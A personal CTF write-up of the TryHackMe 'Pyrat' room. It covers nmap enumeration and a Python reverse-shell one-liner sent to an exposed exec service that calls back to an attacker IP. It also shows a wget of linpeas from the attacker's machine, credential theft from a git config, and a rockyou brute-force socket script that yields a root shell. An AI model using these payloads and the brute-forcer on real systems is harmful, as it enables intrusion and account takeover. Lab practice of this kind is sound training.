---
title: "TryHackMe: Pyrat"
author: med
categories: [TryHackMe]
tags: [python, git, brute-force]
render_with_liquid: false
img_path: /images/tryhackme_pyrat/
image:
  path:  /images/tryhackme_pyrat/room_image.webp
---

**Pyrat** was a room centered around a **Python** program. Initially, we used the program to execute **Python** code and establish a foothold. Afterward, we discovered user credentials within the configuration file of a local **git** repository and switched to that user. Additionally, by enumerating the **git** repository, we found a code snippet from an older version of the program. With knowledge of this source code snippet, we successfully brute-forced an input and a password, allowing us to use the program to obtain a shell as **root**.

[![Tryhackme Room Link]( /images/tryhackme_pyrat/room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/pyrat){: .center }


## Initial Enumeration

### Nmap Scan

```console
$nmap -A -T4 10.10.118.186
Nmap scan report for 10.10.118.186
Host is up (0.093s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: SimpleHTTP/0.6 Python/3.11
...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two open ports:

- **22** (SSH)
- **8000** 

## Shell as www-data

If we make an **HTTP** request to port **8000**, we receive the response: `Try a more basic connection`.

```console
$ curl http://10.10.118.186:8000/
Try a more basic connection
```
I tried Fuzzing folders but the same message `Try a more basic connection!` I tried inject python code in the URL but noting was working the more basic connection that a can in my head is using `nc`
Following the message, connecting with `nc` and attempting to run a command, we encounter an error specific to **Python**.

```console
$ nc 10.10.118.186 8000
test
name 'test' is not defined
```

Pursuing this further, we can confirm that we are able to execute **Python** commands.

```console
print("hello")
hello
```
From this [WebSite](https://www.revshells.com/) I found a verse shell using python
Using this, we can send a **Python** reverse shell payload and obtain a shell.

```py
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.4.214",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

```console
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.9.4.214] from (UNKNOWN) [10.10.118.186] 38688
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
but this session doesn’t have permission to access the user `think` in home folder so the first think I did is to user `linpeas.sh` I went to `tmp` folder since I can get files without any permission and I wget `linpeas.sh` from my pc

```console
$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 ...
10.10.118.186 - - [06/Oct/2024:00:07:35] "GET /linpeas.sh HTTP/1.1" 200 -
```
From the victim machine :
```console
$ wget http://10.9.4.214:8000/linpeas.sh
-- 2024-10-05 23:08:52 -- http://10.9.4.214:8000/linpeas.sh
Connecting to 10.9.4.214:8000 ... connected.
HTTP request sent, awaiting response ... 200 OK
Length: 824942 (806K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 805.61K  89.4KB/s    in 9.0s    

2024-10-05 23:09:01 (89.6 KB/s) - 'linpeas.sh' saved [824942/824942]

$ ls
linpeas.sh
$ chmod +x linpeas.sh
$ ./linpeas.sh
```
## Finding
1. Firstly
![Desktop View](/images/tryhackme_pyrat/finding1.webp){: width="972" height="589" }
the is python script under the root folder witch is the same folder of our HTTP server in the port 8000 I knew that using this test but we don’t have access to the root folder but 90% this file who is responsible for the HTTP server
```console
$ nc 10.10.118.186 8000
import os; print(os.getcwd())
/root
```
2. Secondly
![Desktop View](/images/tryhackme_pyrat/finding2.webp){: width="972" height="589" }

```console
www-data@Pyrat:~$ cat /opt/dev/.git/config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        name = Jose Mario
        email = josemlwdf@github.com

[credential]
        helper = cache --timeout=3600

[credential "https://github.com"]
        username = think
        password = [REDACTED]
```
## Shell as think

After stabilizing the shell and enumerating the file system and reading the `/opt/dev/.git/config` we got a password of `think` user and a user email `josemlwdf@github.com`.

We can use this password to switch to the user and read the user flag.

```console
www-data@Pyrat:~$ su - think
Password:
think@Pyrat:~$ id
uid=1000(think) gid=1000(think) groups=1000(think)
think@Pyrat:~$ wc -c user.txt
33 user.txt
```

## Shell as root

Checking the user’s emails and exploring more this result of `linpeas` we come across an interesting message mentioning a **RAT** program running on the machine.
![Desktop View](/images/tryhackme_pyrat/finding3.webp){: width="972" height="589" }

```console
think@Pyrat:~$ cat /var/mail/think
From root@pyrat  Thu Jun 15 09:08:55 2023
Return-Path: <root@pyrat>
X-Original-To: think@pyrat
Delivered-To: think@pyrat
Received: by pyrat.localdomain (Postfix, from userid 0)
        id 2E4312141; Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
Subject: Hello
To: <think@pyrat>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20230615090855.2E4312141@pyrat.localdomain>
Date: Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
From: Dbile Admen <root@pyrat>

Hello jose, I wanted to tell you that i have installed the RAT you posted on your GitHub page, i'll test it tonight so don't be scared if you see it running. Regards, Dbile Admen
```
{: .wrap }

Checking the running processes, `/root/pyrat.py` is likely the program mentioned.

```console
root         596  0.0  0.0   2608   596 ?        Ss   00:00   0:00 /bin/sh -c python3 /root/pyrat.py 2>/dev/null
root         597  0.0  1.4  21864 14592 ?        S    00:00   0:00 python3 /root/pyrat.py
```

Since in the email he talked about a **RAT** that has been installed from a `github` page of some one called `jose` and previously we found github information about jose he has github Address : `josemlwdf@github.com`

lest search in the browser : “josemlwdf pyrat.py github”
![Desktop View](/images/tryhackme_pyrat/finding4.webp){: width="972" height="589" }

under this repo I found the pyrat.py code source and this is the code responsible of the message that we got in response of a HTTP request
```python
def fake_http():
    try:
        # Get the current date and time
        current_datetime = datetime.datetime.now()

        # Format the date and time according to the desired format
        formatted_datetime = current_datetime.strftime("%a %b %d %H:%M:%S %Z %Y")
        banner = """
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.11.2
Date: {date}""".format(date=formatted_datetime) + """
Content-type: text/html; charset=utf-8
Content-Length: 27

Try a more basic connection!
"""
        return banner[1:]
    except:
        return 'HTTP/1.0 200 OK'
```
Examining the code snippet, it appears that:

- Client Commands:
    - If the client sends the word admin, the get_admin function is called to request a password (in this case, testpass) to grant administrator privileges.
    - If the received command is shell, it opens a shell for the client.
    - Otherwise, the Python code sent by the client is executed through the exec_python function, which uses exec() to run the received Python code.
- Output Redirection: The outputs of the executed command are captured and sent back to the client.
- HTTP Check: It also includes a check to see if the received data is an HTTP request. If it is, a fake HTTP response is returned.
Knowing this, we can write a simple **Python** script to discover the unknown input.

Connecting to the server and sending the `admin` input, we see that it now prompts for a password.

```console
$ nc 10.10.118.186 8000
admin
Password:
```

```python
#!/usr/bin/env python3
import socket
import time


host = '10.10.106.2'
port = 8000


with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as file:  
    passwords = file.readlines()

def attempt_login(password):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))


        s.sendall("admin\n".encode('utf-8'))  # send "admin" to server

        # Get responce from server
        response = s.recv(1024).decode('utf-8', errors='replace')  
        print(f"Réponse du serveur après envoi de 'admin': {response}")

        if "Password:" in response:  
            print(f"Tentative avec le mot de passe : {password}")
            s.sendall((password + "\n").encode('utf-8')) 
            response = s.recv(1024).decode('utf-8', errors='replace')  
            print(f"Réponse du serveur : {response}")
            return "Welcome Admin" in response
    return False

for password in passwords:
    password = password.strip()  #
    success = attempt_login(password)
    if success:
        print(f"Mot de passe trouvé : {password}")
        break
    time.sleep(1) 
```
{: file="attack.py" }


By running the script, we successfully discover the password.

```console
$ python3 attack.py

Réponse du serveur : Welcome Admin!!! Type "shell" to begin
Mot de passe trouvé : [REDACTED]
```

Now, using the password obtained along with the `admin` input, we can elevate our connection to `admin`.

```console
$ nc 10.10.118.186 8000
admin
Password:
[REDACTED]
Welcome Admin!!! Type "shell" to begin
```

After that, by sending the `shell` input to spawn a shell, we see that we obtain a shell as the `root` user and can read the root flag.

```
shell
# id
id
uid=0(root) gid=0(root) groups=0(root)
# wc -c root.txt
wc -c root.txt
33 root.txt
```


<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

</style>